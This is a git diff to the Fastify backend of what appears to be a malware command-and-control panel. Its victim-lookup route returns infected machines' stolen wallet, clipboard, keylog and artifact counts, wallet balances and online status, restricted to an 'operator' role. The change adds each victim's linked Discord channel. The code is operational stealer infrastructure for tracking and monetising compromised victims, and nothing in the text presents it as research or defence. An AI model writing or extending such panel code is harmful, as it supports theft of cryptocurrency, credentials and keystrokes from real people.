@@ -108,12 +108,13 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       where: { id },
       include: {
         build: { select: { id: true, name: true, version: true, buildId: true } },
-        _count: { select: { wallets: true, artifacts: true, tasks: true, clipboard: true, keylogs: true } }
+        _count: { select: { wallets: true, artifacts: true, tasks: true, clipboard: true, keylogs: true } },
+        discord: true
       }
     });
     if (!victim) throw notFound('victim');
     const balanceCount = await prisma.wallet.count({ where: { victimId: id, NOT: { balance: null } } });
-    return { ...victim, online: Date.now() - victim.lastHeartbeatAt.getTime() < 90_000, balances: balanceCount };
+    return { ...victim, discordChannel: victim.discord?.channelId ?? null, online: Date.now() - victim.lastHeartbeatAt.getTime() < 90_000, balances: balanceCount };
   });
 
   app.patch('/victims/:id', { preHandler: requireRole('operator') }, async (request) => {
